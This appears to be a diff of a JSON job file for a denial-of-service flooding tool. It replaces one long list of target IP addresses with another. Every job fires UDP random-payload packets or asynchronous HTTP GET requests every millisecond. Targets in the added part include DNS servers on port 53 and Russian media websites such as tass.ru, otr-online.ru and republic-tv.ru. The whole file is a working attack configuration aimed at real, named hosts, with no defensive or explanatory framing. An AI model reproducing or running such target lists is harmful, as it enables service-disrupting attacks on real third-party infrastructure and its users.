@@ -1,743 +1,195 @@
 {
     "jobs": [
-        {
-            "type": "udp",
-            "args": {
-                "address": "185.133.42.193",
-                "interval_ms": 1,
-                "body": "{{- random_payload 1000 -}}"
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://185.133.42.193:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://109.234.153.11:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://134.0.116.160:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://141.8.192.93:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://141.8.195.125:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://149.154.71.110:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://185.22.152.65:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://185.42.12.130:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://185.72.146.142:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://194.58.112.165:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://194.58.112.167:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://194.67.71.128:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://194.67.71.66:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://194.67.86.61:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://195.24.68.5:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://195.42.186.46:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "udp",
-            "args": {
-                "address": "213.159.211.2",
-                "interval_ms": 1,
-                "body": "{{- random_payload 1000 -}}"
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://213.159.211.2:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "udp",
-            "args": {
-                "address": "217.29.53.65",
-                "interval_ms": 1,
-                "body": "{{- random_payload 1000 -}}"
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://217.29.53.65:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://31.177.76.70:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "udp",
-            "args": {
-                "address": "31.31.198.249",
-                "interval_ms": 1,
-                "body": "{{- random_payload 1000 -}}"
-            }
-        },
-        {
-            "type": "udp",
-            "args": {
-                "address": "31.31.205.163",
-                "interval_ms": 1,
-                "body": "{{- random_payload 1000 -}}"
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://31.31.205.163:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "udp",
-            "args": {
-                "address": "45.10.55.152",
-                "interval_ms": 1,
-                "body": "{{- random_payload 1000 -}}"
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://45.10.55.152:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://45.130.41.13:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://46.183.163.233:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://5.101.152.161:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://5.101.152.218:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://5.101.159.26:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://62.181.46.38:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://77.222.40.64:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://78.108.82.37:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://87.236.16.206:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://87.236.16.239:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://87.236.16.62:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://89.111.167.3:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "udp",
-            "args": {
-                "address": "89.253.223.64",
-                "interval_ms": 1,
-                "body": "{{- random_payload 1000 -}}"
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://89.253.223.64:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "udp",
-            "args": {
-                "address": "91.103.252.108",
-                "interval_ms": 1,
-                "body": "{{- random_payload 1000 -}}"
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://91.103.252.108:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "udp",
-            "args": {
-                "address": "91.201.42.98",
-                "interval_ms": 1,
-                "body": "{{- random_payload 1000 -}}"
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://91.201.42.98:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://91.240.87.136:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://95.183.8.25:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://95.213.164.227:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://185.91.54.139:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://185.137.235.103:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://194.67.71.166:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "udp",
-            "args": {
-                "address": "82.202.172.147",
-                "interval_ms": 1,
-                "body": "{{- random_payload 1000 -}}"
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://82.202.172.147:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://91.189.114.8:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "udp",
-            "args": {
-                "address": "185.133.42.193",
-                "interval_ms": 1,
-                "body": "{{- random_payload 1000 -}}"
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://185.133.42.193:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://109.234.153.11:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://141.8.195.125:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://149.154.71.110:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://185.72.146.142:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://194.58.112.165:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://194.58.112.167:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://194.67.86.61:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://195.24.68.5:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "udp",
-            "args": {
-                "address": "45.10.55.152",
-                "interval_ms": 1,
-                "body": "{{- random_payload 1000 -}}"
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://45.10.55.152:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "udp",
-            "args": {
-                "address": "89.253.223.64",
-                "interval_ms": 1,
-                "body": "{{- random_payload 1000 -}}"
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://89.253.223.64:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "udp",
-            "args": {
-                "address": "91.103.252.108",
-                "interval_ms": 1,
-                "body": "{{- random_payload 1000 -}}"
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://91.103.252.108:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
-        },
-        {
-            "type": "http",
-            "args": {
-                "method": "GET",
-                "path": "http://95.183.8.25:80",
-                "interval_ms": 1
-            },
-            "client": {
-                "async": true
-            }
+      {
+        "type": "udp",
+        "args": {
+          "address": "185.42.137.111:53",
+          "interval_ms": 1,
+          "body": "{{- random_payload 1000 -}}"
         }
+      },
+      {
+        "type": "udp",
+        "args": {
+          "address": "91.217.20.1:53",
+          "interval_ms": 1,
+          "body": "{{- random_payload 1000 -}}"
+        }
+      },
+      {
+        "type": "udp",
+        "args": {
+          "address": "195.93.246.187:53",
+          "interval_ms": 1,
+          "body": "{{- random_payload 1000 -}}"
+        }
+      },
+      {
+        "type": "udp",
+        "args": {
+          "address": "194.58.196.62:53",
+          "interval_ms": 1,
+          "body": "{{- random_payload 1000 -}}"
+        }
+      },
+      {
+        "type": "udp",
+        "args": {
+          "address": "91.217.21.1:53",
+          "interval_ms": 1,
+          "body": "{{- random_payload 1000 -}}"
+        }
+      },
+      {
+        "type": "udp",
+        "args": {
+          "address": "195.93.246.212:53",
+          "interval_ms": 1,
+          "body": "{{- random_payload 1000 -}}"
+        }
+      },
+      {
+        "type": "http",
+        "args": {
+          "method": "GET",
+          "path": "http://tass.ru/",
+          "interval_ms": 1
+        },
+        "client": {
+          "async": true
+        }
+      },
+      {
+        "type": "http",
+        "args": {
+          "method": "GET",
+          "path": "http://82.202.190.240:80",
+          "interval_ms": 1
+        },
+        "client": {
+          "async": true
+        }
+      },
+      {
+        "type": "http",
+        "args": {
+          "method": "GET",
+          "path": "http://82.202.190.240:443",
+          "interval_ms": 1
+        },
+        "client": {
+          "async": true
+        }
+      },
+      {
+        "type": "http",
+        "args": {
+          "method": "GET",
+          "path": "http://82.202.190.240:8010",
+          "interval_ms": 1
+        },
+        "client": {
+          "async": true
+        }
+      },
+      {
+        "type": "http",
+        "args": {
+          "method": "GET",
+          "path": "http://194.28.236.63:80",
+          "interval_ms": 1
+        },
+        "client": {
+          "async": true
+        }
+      },
+      {
+        "type": "http",
+        "args": {
+          "method": "GET",
+          "path": "http://194.28.236.63:443",
+          "interval_ms": 1
+        },
+        "client": {
+          "async": true
+        }
+      },
+      {
+        "type": "http",
+        "args": {
+          "method": "GET",
+          "path": "http://194.28.236.63:8444",
+          "interval_ms": 1
+        },
+        "client": {
+          "async": true
+        }
+      },
+      {
+        "type": "http",
+        "args": {
+          "method": "GET",
+          "path": "http://212.66.37.43:80",
+          "interval_ms": 1
+        },
+        "client": {
+          "async": true
+        }
+      },
+      {
+        "type": "http",
+        "args": {
+          "method": "GET",
+          "path": "http://otr-online.ru/",
+          "interval_ms": 1
+        },
+        "client": {
+          "async": true
+        }
+      },
+      {
+        "type": "http",
+        "args": {
+          "method": "GET",
+          "path": "https://212.66.37.43:443",
+          "interval_ms": 1
+        },
+        "client": {
+          "async": true
+        }
+      },
+      {
+        "type": "http",
+        "args": {
+          "method": "GET",
+          "path": "https://5.178.80.46:443",
+          "interval_ms": 1
+        },
+        "client": {
+          "async": true
+        }
+      },
+      {
+        "type": "http",
+        "args": {
+          "method": "GET",
+          "path": "http://5.178.80.46:80",
+          "interval_ms": 1
+        },
+        "client": {
+          "async": true
+        }
+      },
+      {
+        "type": "http",
+        "args": {
+          "method": "GET",
+          "path": "http://republic-tv.ru/",
+          "interval_ms": 1
+        },
+        "client": {
+          "async": true
+        }
+      }
     ]
-}
+  }
